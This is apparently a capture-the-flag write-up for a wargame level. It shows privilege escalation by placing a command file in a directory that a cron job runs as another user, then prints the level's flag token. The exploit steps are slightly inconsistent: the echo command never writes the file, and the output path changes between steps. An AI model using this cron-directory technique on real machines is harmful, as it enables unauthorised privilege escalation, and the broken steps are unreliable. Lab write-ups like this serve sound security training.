## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```

This shows that we are operating as the user `level05`.

---
When we logged into the machine, a message appeared:
```
You have new mail.
```

## Step 2: Searching for Files

Next, let's search for files related to mail:
```bash
$ find / -name mail 2> /dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail

```

Among the results, the contents of `/rofs/var/mail/level05` seem interesting:
```bash
$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
We learn from this that a cron job is running every 2 minutes, executing the script `/usr/sbin/openarenaserver` with `flag05` user privileges.

Let's take a look at this script.

---
## Step 3: Read the source code of script

First, let's identify the type of the script:
```bash
$ file /usr/sbin/openarenaserver
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
```
```bash
$ cat /usr/sbin/openarenaserver

#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
### Explanation:
The script loops over all files in the /opt/openarenaserver/ directory.
For each file, it runs the script with bash in debug mode (bash -x) while limiting the execution time to 5 seconds using ulimit -t 5.
After executing, the script deletes the file.

---
## Step 4: Exploiting the Binary to Get a flag
To exploit this, we can create a file in /opt/openarenaserver/ that contains a command we want to execute with flag05 privileges. In this case, we want to obtain the flag, so we can create a file with the following content:

```bash
echo 'getflag > /tmp/output_getflag'
```
When the cron job runs the script, it will execute our file and redirect the output of getflag to /tmp/output_getflag.

```bash
$ cat /tmp/output_flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
---

And there you have it, the token is `viuaaale9huek52boumoomioc`.
